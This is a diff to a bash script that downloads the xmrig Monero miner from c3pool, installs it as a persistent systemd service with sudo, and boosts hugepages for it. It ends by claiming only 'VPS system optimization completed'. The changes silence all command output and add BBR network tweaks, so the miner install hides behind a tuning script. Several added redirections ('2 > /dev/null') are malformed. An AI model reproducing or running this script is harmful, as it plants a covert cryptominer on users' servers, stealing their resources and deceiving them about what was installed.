@@ -2,12 +2,12 @@
 
 VERSION=2.11
 
-if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
+if sudo -n true 2 > /dev/null 2>&1; then
+  sudo systemctl stop c3pool_miner.service > /dev/null 2>&1
 fi
-killall -9 xmrig >/dev/null
+killall -9 xmrig > /dev/null 2>&1
 
-rm -rf $HOME/c3pool
+rm -rf $HOME/c3pool >/dev/null
 
 if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   exit 1
@@ -68,8 +68,8 @@ if ! sudo -n true 2>/dev/null; then
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
-    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf 
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) 
   fi
 
   if ! type systemctl >/dev/null; then
@@ -89,11 +89,14 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
-    sudo killall xmrig 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
+    sudo killall xmrig 2 > /dev/null 2>&1
+    sudo systemctl daemon-reload > /dev/null 2>&1
+    sudo systemctl enable c3pool_miner.service > /dev/null 2>&1
+    sudo systemctl start c3pool_miner.service > /dev/null 2>&1
   fi
 fi
+echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
+echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
+sysctl -p
 
 echo '已完成vps系统优化'
